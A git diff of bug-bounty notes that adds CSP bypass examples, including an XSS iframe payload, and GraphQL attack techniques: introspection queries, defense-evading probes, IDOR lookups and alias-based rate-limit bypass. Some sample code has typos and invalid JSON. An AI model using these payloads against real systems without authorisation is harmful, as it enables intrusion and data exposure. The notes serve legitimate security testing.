@@ -2003,8 +2003,6 @@ XSLT file:
 - [Bypass-firewalls-by-DNS-history](https://github.com/vincentcox/bypass-firewalls-by-DNS-history)
     
 - If you have a set of potential IPs where the web page is located you could use [https://github.com/hakluke/hakoriginfinder](https://github.com/hakluke/hakoriginfinder)
-    
-
 
 ```
 # You can check if the tool is working with
@@ -2538,7 +2536,6 @@ Techniques [from this research](https://rafa.hashnode.dev/exploiting-http-parser
 
 Nginx rule example:
 
-Copy
 
 ```
 location = /admin {
@@ -2563,9 +2560,6 @@ In order to prevent bypasses Nginx performs path normalization before checking i
 |1.18.0|`\xA0`, `\x09`, `\x0C`|
 |1.16.1|`\xA0`, `\x09`, `\x0C`|
 
-### 
-
-[](https://book.hacktricks.xyz/pentesting-web/proxy-waf-protections-bypass#flask)
 
 **Flask**
 
@@ -2593,8 +2587,6 @@ In order to prevent bypasses Nginx performs path normalization before checking i
 
 Nginx FPM configuration:
 
-Copy
-
 ```
 location = /admin.php {
     deny all;
@@ -2607,10 +2599,6 @@ location ~ \.php$ {
 ```
 
 Nginx is configured to block access to `/admin.php` but it's possible to bypass this by accessing `/admin.php/index.php`.
-
-### 
-
-[](https://book.hacktricks.xyz/pentesting-web/proxy-waf-protections-bypass#how-to-prevent)
 
 How to prevent
 
@@ -3652,6 +3640,58 @@ ReturnUrl=https://c1h2e1.github.io
 ### <font color="red">NOTE</font>: Often in bug bounty reports, you’ll need to show companies that real attackers could effectively exploit the vulnerability you found. That means youneed to understand how attackers can exploit clickjacking bugs in the wild.Clickjacking vulnerabilities rely on user interaction. For the attackto succeed, the attacker would have to construct a site that is convincingenough for users to click. This usually isn’t difficult, since users don’t often  take precautions before clicking web pages. But if you want your attack to become more convincing, check out the Social-Engineer Toolkit (https://github.com/trustedsec/social-engineer-toolkit/). This set of tools can, among other things, help you clone famous websites and use them for malicious purposes. You can then place the iframe on the cloned website. In my experience, the most effective location in which to place the hidden button is directly on top of a Please Accept That This Site Uses Cookies! pop-up. Users usually click this button to close the window without much thought.
 # <font color="red">CSP BYPASS</font>
 
+CSP is predominantly the most effective method for preventing XSS attacks.
+However, it is common for web administrators to inadvertently relax the
+CSP to accommodate functionality in web applications
+
+### CSP Bypass : e.g 1 (unsafe inline)
+
+in csp `script-src` directive is used to whitelist a specified source of scripts.
+if `script-src` is set to `self` , it would mean that only the scripts with the same origin are followed to be loaded . Here is what a standard policy might look like 
+
+```
+Contetn-Security-Policy: script-src 'unsafe-inline';
+```
+
+Occasionally, the “script-src” directive might be set to “unsafe-inline”; this
+although will prevent third-party scripts that are not whitelisted from being loaded 
+However at the same time, it will allow inline script elements, event handlers, and Javascript URLs to execute.
+
+### CSP Bypass: third party endpoints and "Unsafe-eval":
+In a scenario whereby a website administrator has whitelisted a CDN domain as part of CSP and has also enabled `unsafe-eval` it might be possible to load a vulnerable version of a library which is already hosted on the whitelisted CDN, and then execute arbitrary JavaScript.
+
+```
+Example :
+Contetn-Security-Policy: script-src https://cdnjs.cloudflare.com 'unsafe-eval'
+```
+
+### CSP Bypass : Data URI ALLOWED
+
+In this scenario, CSP is configured with script-src `self` but also permits the inclusion of `data`. This configuration could lead to security bypasses, as it allows the use of data URLs which can embed actual script content. 
+
+```
+Contetn-Security-Policy: script-src 'self' data:;
+```
+
+in this configuration, since the use of the data URI is allowed, it can be used to embed HTML content directly within the iframe , as opposed to loading it from an external source. In iframe, the srcdoc attribute can be used to facilitate the createion of an inline document.
+
+```
+payload :
+<iframe srcdoc='<script src="data:text/javascript, alert(document.domain)"></script>'</iframe>
+```
+### CSP Bypass through Javascript file upload 
+
+As we are aware that CSP prevents the loading of JavaScript from external
+websites, to allow internal scripts, the “self” flag is used. However, if a web-
+site is vulnerable to file uploads and allows uploading of “.js” files, these files
+can be referenced in an XSS vector.
+
+As a result, they will be treated as scripts
+coming from the same origin, thereby potentially bypassing the CSP.
+
+
+
+
 # <font color="red">COOKIE HACKING</font>
 
 # <font color="red">2FA/OTP BYPASS</font>
@@ -4503,3 +4543,284 @@ some application do have questions in order to send an email to change password 
 # <font color="red">JSONP (xss inclusion)</font>
 
 
+# <font color="red">GraphQL API vulnerabilities</font>
+
+
+
+## finding GraphQL endpoints
+
+#### universal queries 
+
+if you send `query{__typename}` to any graphql  endpoint, it will include the string `{"data": {"__typename": "query"}}` .   this is know as a universal query, and is a useful tool in probing whether a URL corresponds to a GraphQL service .
+```
+{"query":"{__typename}"}
+```
+#### common endpoint names
+
+graphQL services often use similar endpoint suffixes. you should look to send universal queries to the following locations:
+
+- `/graphql`
+- `/api`
+- `/api/graphql`
+- `/graphql/api`
+- `/graphql/graphql`
+
+Note: you could try to append `/v1` to the path
+
+#### request methods
+
+It is best practice for production GraphQL endpoints to only accept POST requests that have a content-type of `application/json`, as this helps to protect against CSRF vulns.
+However , some endpoints may accept alternative methods, such as GET requests or POST requests that use a content-type of `x-www-form-urlencoded `. 
+
+Note: so if you can't find the Graphql endpoints by sending POST requests to common endpoints, try resending the universal query using other verbs.
+
+
+## Exploiting unsanitized arguments 
+
+
+if the API uses arguments to access objects directly, it may be vulnerable to access control vulns( e.g IDOR ). 
+
+For example :
+
+```
+query {
+	products{
+		id
+		name
+		listed
+	}
+
+}
+
+```
+
+the product list returns :
+
+```
+{
+	"data":{
+		"products":[
+			{
+				"id": 1,
+				"name": "Product 1",
+				"listed": true
+			},
+			
+			{
+				"id": 2,
+				"name": "product 2",
+				"listed": true
+			},
+			
+			{
+				"id": 4,
+				"name": "product 4",
+				"listed": true
+				}
+		]
+	}
+
+
+}
+```
+
+- Products assigned sequential
+- Product ID 3 is missing , possibly because it has been delisted.
+
+By querying the ID of the missing product, we can get its detail, even though it is not listed on the shop and was not returned by the original product query.
+
+```
+# query to get missing product 
+query {
+	product(id: 3){
+		id
+		name
+		listed
+	}
+}
+```
+
+```
+# missing product response 
+{
+	"data": {
+		"product"{
+			"id": 3, 
+			"name": "product 3",
+			"listed": no
+		}
+	}
+
+
+
+}
+
+```
+
+## Discovering schema information
+
+the best way to do this is to use introspection queries. Introspection is a built in GraphQL function that enables you to query a server for information about schema 
+
+
+to use introspection to discover schema information, query the `__schema` field. 
+
+#### probing for introspection 
+
+it is best practice for introspection to be disabled in production environment, but this advice is not always followed 
+
+ Introspection probe request :
+
+```
+
+{
+	"query": "{__schema{queryType{name}}}"
+}
+```
+
+the next step is to run a full introspection query against the endpoint
+ 
+Full introspection query:
+add this to the GraphQL bar of repeater :
+
+```
+
+    query IntrospectionQuery {
+        __schema {
+            queryType {
+                name
+            }
+            mutationType {
+                name
+            }
+            subscriptionType {
+                name
+            }
+            types {
+             ...FullType
+            }
+            directives {
+                name
+                description
+                args {
+                    ...InputValue
+            }
+            onOperation  #Often needs to be deleted to run query
+            onFragment   #Often needs to be deleted to run query
+            onField      #Often needs to be deleted to run query
+            }
+        }
+    }
+
+    fragment FullType on __Type {
+        kind
+        name
+        description
+        fields(includeDeprecated: true) {
+            name
+            description
+            args {
+                ...InputValue
+            }
+            type {
+                ...TypeRef
+            }
+            isDeprecated
+            deprecationReason
+        }
+        inputFields {
+            ...InputValue
+        }
+        interfaces {
+            ...TypeRef
+        }
+        enumValues(includeDeprecated: true) {
+            name
+            description
+            isDeprecated
+            deprecationReason
+        }
+        possibleTypes {
+            ...TypeRef
+        }
+    }
+
+    fragment InputValue on __InputValue {
+        name
+        description
+        type {
+            ...TypeRef
+        }
+        defaultValue
+    }
+
+    fragment TypeRef on __Type {
+        kind
+        name
+        ofType {
+            kind
+            name
+            ofType {
+                kind
+                name
+                ofType {
+                    kind
+                    name
+                }
+            }
+        }
+    }
+```
+
+```
+{"query":"\r\n    query IntrospectionQuery {\r\n        __schema {\r\n            queryType {\r\n                name\r\n            }\r\n            mutationType {\r\n                name\r\n            }\r\n            subscriptionType {\r\n                name\r\n            }\r\n            types {\r\n             ...FullType\r\n            }\r\n            directives {\r\n                name\r\n                description\r\n                args {\r\n                    ...InputValue\r\n            }\r\n\r\n            }\r\n        }\r\n    }\r\n\r\n    fragment FullType on __Type {\r\n        kind\r\n        name\r\n        description\r\n        fields(includeDeprecated: true) {\r\n            name\r\n            description\r\n            args {\r\n                ...InputValue\r\n            }\r\n            type {\r\n                ...TypeRef\r\n            }\r\n            isDeprecated\r\n            deprecationReason\r\n        }\r\n        inputFields {\r\n            ...InputValue\r\n        }\r\n        interfaces {\r\n            ...TypeRef\r\n        }\r\n        enumValues(includeDeprecated: true) {\r\n            name\r\n            description\r\n            isDeprecated\r\n            deprecationReason\r\n        }\r\n        possibleTypes {\r\n            ...TypeRef\r\n        }\r\n    }\r\n\r\n    fragment InputValue on __InputValue {\r\n        name\r\n        description\r\n        type {\r\n            ...TypeRef\r\n        }\r\n        defaultValue\r\n    }\r\n\r\n    fragment TypeRef on __Type {\r\n        kind\r\n        name\r\n        ofType {\r\n            kind\r\n            name\r\n            ofType {\r\n                kind\r\n                name\r\n                ofType {\r\n                    kind\r\n                    name\r\n                }\r\n            }\r\n        }\r\n    }"}
+```
+
+
+NOTE : you can copy the result of the above query and paste it to a GraphQL visualizer .
+<font color="red">Note</font> : using the tool InQL we can  
+### Suggestions
+
+Even if introspection is entirely disabled, you can sometimes use suggestions to glean informations to glean information on an API structure.
+
+Suggestions are a feature of the Apollo GraphQL platform in which the server can suggest query amendments in error messages. These are generally used where a query is slightly incorrect but still recognizable(for example, `there is no entry for 'productInfo'. Did you mean 'ProductInformation' instead?`)
+
+Note: there is a tool called clairvoyance which uses suggestions to automatically recover all or part of  a GraphQL schema.
+https://github.com/nikitastupin/clairvoyance
+
+## Bypassing GraphQL introspection defenses 
+
+if you cannot get introspection queries to run for the API you are testing, try inserting a special character after the `__schema` keyword.
+
+NOTE: When developers disable introspection, they could use a regex to exclude the `__schema` keyword in queries. You should try characters like spaces, new lines and commas, as they are ignored by GraphQL but not by flawed regex. 
+
+if the developer has only excluded `__schema{`, then the below introspection query would not be excluded .
+
+```
+{ "query": "query{__schema {queryType{name}}}" }
+```
+
+but this may be :
+```
+{
+	"query": "{__schema
+{queryType{name}}}"
+ }
+```
+
+<font color="red">NOTE </font>If this doesn't work, try running the probe over an alternative request method, as introspection may only be disabled over POST. Try a GET request, or a POST request with a content-type of `x-www-form-urlencoded`.
+
+
+an introspection probe sent via GET, with URL-encoded parameters:
+
+```
+GET /graphql?query=query%7B__schema%0A%7BqueryType%7Bname%7D%7D%7D
+```
+
+## Bypassing ratelimiting using alliases
+The simplified example below shows a series of aliased queries checking whether store discount codes are valid. This operation could potentially bypass rate limiting as it is a single HTTP request, even though it could potentially be used to check a vast number of discount codes at once
+
+ Requests with aliases queries:
+```
+query isValidDiscount($code: Int) { isvalidDiscount(code:$code){ valid } isValidDiscount2:isValidDiscount(code:$code){ valid } isValidDiscount3:isValidDiscount(code:$code){ valid } }
+
+```
